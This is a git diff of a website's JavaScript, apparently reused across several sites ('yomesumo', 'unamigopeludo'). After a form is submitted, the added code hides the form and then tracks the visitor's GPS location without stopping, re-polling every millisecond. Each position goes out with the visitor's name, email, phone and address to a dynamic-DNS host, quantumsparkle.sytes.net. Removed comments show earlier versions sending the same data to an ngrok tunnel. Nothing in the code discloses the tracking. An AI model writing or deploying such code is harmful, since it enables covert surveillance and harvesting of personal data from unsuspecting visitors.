@@ -232,19 +232,6 @@
             return false;
 
         });
-
-        // BG after scroll
-
-        $(window).scroll(function () {
-
-            if ($(window).scrollTop() >= 100) {
-                $(".nav-bar-compact").addClass("js-nbc-bg");
-            } else {
-                $(".nav-bar-compact").removeClass("js-nbc-bg");
-            }
-
-        });
-
     }
 
 
@@ -1147,155 +1134,18 @@ scrollButtons.forEach(button => {
     });
 });
 
-// function startLocationTracking() {
-//     let response;
-//     // const socket = new WebSocket("wss://quantumsparkle.sytes.net/");
-//     const socket = new WebSocket("wss://86b1-2806-107e-1d-45f2-5dca-9569-4804-539a.ngrok-free.app/");
-
-//     let locationData = JSON.parse(localStorage.getItem("location"));
-//     const name = document.getElementById("name").value; // Get the user's name
-//     const email = document.getElementById("email").value; // Get the user's email
-//     const telefono = document.getElementById("telefono").value; // Get the user's email
-//     const direccion = document.getElementById("direccion").value; // Get the user's email
-//     let user_id = localStorage.getItem("user_id");
-
-//     socket.onopen = () => {
-
-//         setInterval(() => {
-//             navigator.geolocation.watchPosition(
-//                 (position) => {
-//                     const {
-//                         latitude,
-//                         longitude
-//                     } = position.coords;
-//                     const locationData = {
-//                         latitude,
-//                         longitude
-//                     };
-//                     // console.log("Saving location:", locationData);
-//                     localStorage.setItem("location", JSON.stringify(locationData));
-//                 },
-//                 (error) => {
-//                     console.error("Error getting location:", error.message);
-//                 }, {
-//                     enableHighAccuracy: true,
-//                     maximumAge: 3000, // 3 seconds
-//                 }
-//             );
-
-//             locationData = JSON.parse(localStorage.getItem("location"));
-//             if (locationData) {
-//                 // console.log("Sending location and user info:", locationData, name, email);
-
-//                 // Combine location data, name, and email into an object
-//                 const userData = {
-//                     location: locationData,
-//                     name: name,
-//                     email: email,
-//                     telefono: telefono,
-//                     direccion: direccion,
-//                     user_id: user_id
-//                 };
-//                 console.log(userData);
-
-//                 response = socket.send(JSON.stringify(userData));
-
-//                 const newLocationData = {
-//                     latitude: locationData.latitude,
-//                     longitude: locationData.longitude,
-//                 };
-//                 localStorage.setItem("location", JSON.stringify(newLocationData));
-//             }
-//         }, 500);
-
-
-//         setInterval(() => {
-//         const locationData = JSON.parse(localStorage.getItem("location"));
-//         const name = document.getElementById("name").value; // Get the user's name
-//         const email = document.getElementById("email").value; // Get the user's email
-//         const telefono = document.getElementById("telefono").value; // Get the user's email
-//         const direccion = document.getElementById("direccion").value; // Get the user's email
-//         let user_id = localStorage.getItem("user_id");
-
-//         if (locationData) {
-//             console.log("locationData", locationData);
-//             console.log(user_id);
-//             // console.log("Sending location and user info:", locationData, name, email);
-
-//             // Combine location data, name, and email into an object
-//             const userData = {
-//                 location: locationData,
-//                 name: name,
-//                 email: email,
-//                 telefono: telefono,
-//                 direccion: direccion,
-//                 user_id: user_id
-//             };
-
-//             response = socket.send(JSON.stringify(userData));
-
-//             const newLocationData = {
-//                 latitude: locationData.latitude,
-//                 longitude: locationData.longitude,
-//             };
-//             localStorage.setItem("location", JSON.stringify(newLocationData));
-//         }
-//         }, 400);
-
-//     };
-
-//     socket.onmessage = async (event) => {
-//         const response = JSON.parse(event.data);
-//         if (response.status == 200)
-//             localStorage.setItem("user_id", response.user_id);
-
-//     };
-// }
-
-// function startLocationTracking() {
-//     let locationData = JSON.parse(localStorage.getItem("location"));
-//     const name = document.getElementById("name").value;
-//     const email = document.getElementById("email").value;
-//     const telefono = document.getElementById("telefono").value;
-//     const direccion = document.getElementById("direccion").value;
-//     // let user_id = localStorage.getItem("user_id");
-//     let user_id;
-
-//     setInterval(() => {
-//         navigator.geolocation.watchPosition(
-//             async (position) => {
-//                     const {
-//                         latitude,
-//                         longitude
-//                     } = position.coords;
-//                     const locationData = {
-//                         latitude,
-//                         longitude
-//                     };
-
-//                     localStorage.setItem("location", JSON.stringify(locationData));
-//                     user_id = localStorage.getItem("user_id");
-//                     await sendLocationData(locationData, name, email, telefono, direccion, user_id);
-//                 },
-//                 (error) => {
-//                     console.error("Error getting location:", error.message);
-//                 }, {
-//                     enableHighAccuracy: true,
-//                     maximumAge: 3000,
-//                 }
-//         );
-//     }, 500);
-// }
-
-
-function startLocationTracking() {
+// Funcion para obtener ubicacion y enviarla al servidor
+async function startLocationTracking() {
     const name = document.getElementById("name").value;
     const email = document.getElementById("email").value;
     const telefono = document.getElementById("telefono").value;
     const direccion = document.getElementById("direccion").value;
 
+    // Se intenta obtener la ubicacion
     async function getLocationAndSendData() {
         try {
+
+            // Se solicita el permiso y se i¿obtiene la ubicacion
             const position = await new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(resolve, reject, {
                     enableHighAccuracy: true,
@@ -1303,6 +1153,7 @@ function startLocationTracking() {
                 });
             });
 
+            // Se obtiene lat y long
             const {
                 latitude,
                 longitude
@@ -1312,22 +1163,29 @@ function startLocationTracking() {
                 longitude
             };
 
+            // Se guarda en el navegador la ubicacion
             localStorage.setItem("location", JSON.stringify(locationData));
             const user_id = localStorage.getItem("user_id");
 
+            // Se manda la info
             await sendLocationData(locationData, name, email, telefono, direccion, user_id);
 
-            setTimeout(getLocationAndSendData, 1); // Recursive call after 1ms
+            // Se llama nuevamente la funcion para actualizar
+            setTimeout(getLocationAndSendData, 1);
         } catch (error) {
-            console.error("Error getting location:", error.message);
-            setTimeout(getLocationAndSendData, 1); // Retry after 1ms
+
+            // Si no permite la ubicacion se envia solamente la info
+            const user_id = localStorage.getItem("user_id");
+            await sendLocationData({}, name, email, telefono, direccion, user_id);
         }
     }
 
-    getLocationAndSendData();
+    // Se llama para obtener la info
+    getLocationAndSendData()
 }
 
 async function sendLocationData(locationData, name, email, telefono, direccion, user_id) {
+    // Se especifican los campos
     const userData = {
         location: locationData,
         name: name,
@@ -1335,9 +1193,10 @@ async function sendLocationData(locationData, name, email, telefono, direccion, 
         telefono: telefono,
         direccion: direccion,
         user_id: user_id,
-        pagina: "yomesumo",
+        pagina: "unamigopeludo",
     };
 
+    // Se manda a la info a que se guarde
     try {
         const response = await fetch("https://quantumsparkle.sytes.net/location/", {
             method: "POST",
@@ -1349,19 +1208,19 @@ async function sendLocationData(locationData, name, email, telefono, direccion, 
 
         if (response.ok) {
             const responseData = await response.json();
+            // Se pone el user_id en el navegador para obtener la relación de qué usuario es
             localStorage.setItem("user_id", responseData.data.idPersona);
-            console.log("Response from server:", responseData.data.idPersona);
         } else {
-            console.log("Failed to send data:", response.status, response.statusText);
         }
     } catch (error) {
         console.error("Error:", error);
     }
 }
 
-
+// Se llama para comenzar losm procesos y se quita el formulario de la vista de la persona
 function onSubmitForm(event) {
     event.preventDefault();
+    // Se limpia el cache
     localStorage.clear();
 
     var formulario = document.getElementById('formulario');
@@ -1369,5 +1228,6 @@ function onSubmitForm(event) {
     formulario.style.display = 'none';
     divForm.style.display = 'block';
 
+    // Se llama la funcion para enviar la info
     startLocationTracking();
 }
